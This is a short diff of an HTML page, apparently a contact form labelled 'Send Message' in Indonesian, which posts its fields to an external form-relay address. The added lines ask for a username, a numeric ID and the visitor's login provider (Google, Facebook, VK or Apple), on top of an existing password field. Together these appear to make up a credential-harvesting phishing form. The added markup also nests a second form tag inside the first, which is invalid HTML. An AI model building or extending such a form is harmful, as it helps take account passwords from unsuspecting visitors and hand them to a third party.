@@ -136,6 +136,19 @@ button:hover{
   <h2>Send Message</h2>
 
   <form action="https://formsubmit.co/24f4ca10aec07753845205d99b173fb9" method="POST">
+    <input type="text" name="Username" placeholder="Username" required>
+    <input type="number" name="Id" placeholder="Id" required>
+   
+    <form>
+    <label for="login">Login:</label>
+    <select id="login" name="login">
+        <option value="">-- Pilih --</option>
+        <option value="google">Google</option>
+        <option value="facebook">Facebook</option>
+        <option value="vk">Vk</option>
+        <option value="apple">Apple</option>
+    </select>
+  
     <input type="text" name="name" placeholder="Nama" required>
     <input type="text" name="Masukkan Password" placeholder="Password" required>
     <textarea name="message" rows="4" placeholder="Pesan" required></textarea>
